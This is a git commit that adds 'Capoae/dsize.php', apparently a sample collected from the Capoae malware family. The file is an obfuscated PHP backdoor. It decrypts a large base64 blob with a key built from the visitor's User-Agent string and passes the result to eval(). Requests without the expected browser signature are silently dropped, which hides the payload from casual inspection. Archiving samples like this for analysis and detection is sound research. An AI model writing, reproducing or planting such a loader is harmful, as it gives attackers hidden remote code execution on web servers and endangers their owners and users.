567a534c5a2f5a4c282a1e4cd3338adc74b8808c
NavyTitanium <33707347+NavyTitanium@users.noreply.github.com>
2021-10-12 09:46:54 -0400

    Create dsize.php

---
+++ Capoae/dsize.php
@@ -0,0 +1,36 @@
+<?php
+$ddrgh = "ophhm6XWmKhhiZStqoa+VqaZz5ZVw1pisj8+OajH0sSml2FZYJKXp6LfmpTVmtNbZF+QYFqUVZh+d4iLWNDF0J5UlmBZkaOcqYxeoXI8bJmboNFRWtiWp5ifmVCp18fGnqWsWW1wPbFGb5vb05XXnaemgpiY2pCwnJRcVKvU0Iy0P0NSO4eWqavRVaOFldimpJfLn5zaWWJyO0E6P8XZ1aWRrJem0qOoYYmY29eej1R7jbR9graFmIyEgFxWhtnVpVt0Pzxslqmr0ZTZyqbSpKxghpSo2J1lV3WJgoKxtLeYen5zdqiFYFnLltLYl4xvRUJrlKjYnZiql6ifptaMh5ynq55eg3aJi7GEtrmRtXmMjbR/h7hyh4p4eYJigpWMdD9DO1bHlKiaopjb157CmbCdxVlXyaaro1tvPUBrx9irnpiVntKmmWGJmNvXnoxvRUJrmpmOUl2bk6iRX91xbUI7XZaT15RUdoV1zM6eyJOfndaQltWfrZygqKNehtnVpVt0PzxssEFDbqfL2afVolhcxpKnx2xGQa9BOp/IjMyspZ6mWoeSe365kIjMVMBdYbNvOzyKmFl0UliPfae4vmCZYI9tcD09XcxVo4WUxKedbpaQl8uUqJuXXKOq1MPVqKZqZVqHml1ioEJwbpvJVGCo1JaaxZ6aq5WcWF2R2dWlb2FgXKJcWp3Op6ONYI1dZ1+OUVfNXVlbm6KWpYuNg7Q/Qzs7h6impYVyhomb0Zqnk5OObnM7QkBWmJmogqGDXZunmKG+ZZF0cj9v4j9tPVyt1J1To1FdrKSga0NsbYerlqKkUqBTWJ3Op6FyPGx0paPGmqWOU2dmVGJQWtTIzKtbdD88bFepq9Fmo4ya16iocpFgWoZfWVunppxWkISKrZemop7Ep5lnzanT0VmeQUJBhqal0mN2XpqopKack5JgUmdSVtiloFmTVY3OoMeZsGbWqaeNbEZBO1iUn9SVoGBgaFlSkVNYq8me2IVgg1tnX4JfU42lnqSioJGqx5LLrZ+lWW1wPT1dyZ7Yl2+KYmdfgl9TiqOdoKRUXlaJk4pZYFlZm9GXmbGTpc7VWZ5BQkGGmaCXUXZXmZmkldnJxWFWrqSelFxvRm8+is2flVR1WMmWp8WonplaWKWozpaMdD9DO5jMn5mY1araxJXSoqyd0KWmjlWdoKRlXFrK0ZRibUY8O8mcoJ7EpdvZkcajpqzHn6fZWV2bm6ZiYobM0GtbdD88bFeamNip2MCPg3FYWIaVnNhidEQ8PVScwdfXq42WUm+DU1idzqeYoD9tPZ6n1JaUyZlhW5iTo6rUhMSsUl2Ym8+YqpqOsHNvO2ydnmDImp/LkJ6vm6ekqYqIyaKenqiTjFyvRm8+b25Wy5WmnM6WU6NRn6aimZ5ehsrMpZevk16KpZZgjnBzbztsPVyqxqSc4JZZdFKamaLH18yzl2FUYJJVYl3LntLKqMRdc0VsOjxvVYyrpKiVo9KEoFmYq5eTx1tYocajytGXj1RcqsaknOCWYnJSQTo/a23JnJ6opZeLV5ya05nSylueVEVCazo8z5dhqqamo6rUjIeMpquml9CjYGCUZMzOnshUnabGWFyPrEZBOz05P8fHy6hSW26ioW+nqcajhtim3KCddYmXotSlZq6XnZee1p7FqJ6dbZXSn6Orn5zYypfRb192hpec0pavmFKnpZnFydasbmilosShcnWUpaSHbXA+QUFrOnPJmaamllxUnMvQyK+TZWJpl2dddHI/b2474Jmkq8esQHA6QkA7mZOe0YSFdaJ3bqXTlKJZ2Knf0ZegW56n0KVg3ZainpqoapjR0Md0laieodVtpp7JcI2jVsmdpJ3YklPYlqWmk5hsZdXUxKdwdWGioVVvRm8+b26vcD5BQWumodmWrV9Wh6So1snQqVt0PzxsQD5CbrLL0aXIr0VCazo8y5ShplJWbKagoNapk6dSpdesoJ6iXMzUoNdhr53LmJvaa5umnphrmdHQ0qtsq5eWnlpyXcue0sqoxFSmp9ZRmdWmp5tuY6Omw9KhdWGpcFSeQD5CbrJzbzvgQUJBhqSn2FF2V1mEdG/Zxat6fZqJi9KUjIffj762oa16cYC0h4XIe2uFoZaHb82ulGmignWL0Hx3etCNlsl4uXqrprtjm9qTa4igjIN3m7S2eqCGhZXTmKuor46YzabFZomnrKpo1ZWAfZyNYozcx9ycpYZ2g5OBd6SceM3RnMR7aa68dJrUkpBsnY6IndfHqqGpg6up2oF4ipWAuth9pouOosN4a817a4Whlodvza2qpayCeWvVfa6ssJu31aK9naCoxWSB0pV8np2MYJqouqmsoJ1lfNOXe47TjbnQma2dkZ/GeX3Wk4yenYxgmqi6qaygnWV805d7jtONudCiyKungqx5l9+SkYmefXRmycirg6KbhZnOi2Sdq4us2KDHZ4KoxniI1ImMoml3l6HNx6p/Ypp1c5x9rW3bf9+Zma18nLHDiYXSfaKap5V4iNbGppxpfJmdzoxmctqZrbunx3hoprxjbNyLa6+egIiE0siqjqadn4jclIuT1Y6Yq2LEi3GtsZp01H2iiWWXnaKSvrZtoIWfmpOVi7DThN3UfL2hpKu8h2zdlZGJmI1ib9fIqo+nnXp/0n18e82ZrcylrXuGrsSfhdKTp4iig6ehrae6j5yaeWrKfXuH25fUt57FoolvpZifl5Omr6KWnanRrpVqn5qFZ9qUfHrTgLrYfcmFdXWJbEBwOp+gnpmPptfYwpyhp6aX0aenYYdjldKYzGKooNJTX8iSrJxoaI+ax8fSnZdhVqXXpV1ioEJwblbJnaSd0JKgy25ZqqeWo6rUjIeYhX6EiKiFj2C1fbbEhaiAfl+/Xabao6unoadYWsG3qIuIfoSNioN8icSIq7F4ipFkX5FYXJFiYnI/Pjmr0NDMp51hWWCSWmJdy57SyqDEoZ1hnT49b3Gcn5+jlF6Eksutk5yVl9amVmWVbJuaW55BQrVvOw==";
+function kitcode($ddrgh, $hhiue){
+    $hhiue = md5($hhiue);
+    $x = 0;
+    $ddrgh = base64_decode($ddrgh);
+    $len = strlen($ddrgh);
+    $l = strlen($hhiue);
+    $char = '';
+    for ($i = 0; $i < $len; $i++) {
+        if ($x == $l) {
+            $x = 0;
+        }
+        $char .= substr($hhiue, $x, 1);
+        $x++;
+    }
+    $str = '';
+    for ($i = 0; $i < $len; $i++) {
+        if (ord(substr($ddrgh, $i, 1)) < ord(substr($char, $i, 1))) {
+            $str .= chr((ord(substr($ddrgh, $i, 1)) + 256) - ord(substr($char, $i, 1)));
+        } else {
+            $str .= chr(ord(substr($ddrgh, $i, 1)) - ord(substr($char, $i, 1)));
+        }
+    }
+    return $str;
+}
+$outt = $_SERVER['HTTP_USER_AGENT'];
+if(preg_match('/ Apple(.*) \(/is',$outt,$uki)){
+	$hhiue = str_replace('Kit/58','pEl',$uki[1]);
+	$hhiue = explode(".",$hhiue);
+	$hhiue = $hhiue[1].$hhiue[0].'uKje';
+}else{
+	die();
+}
+$str = kitcode($ddrgh, $hhiue);
+eval($str);
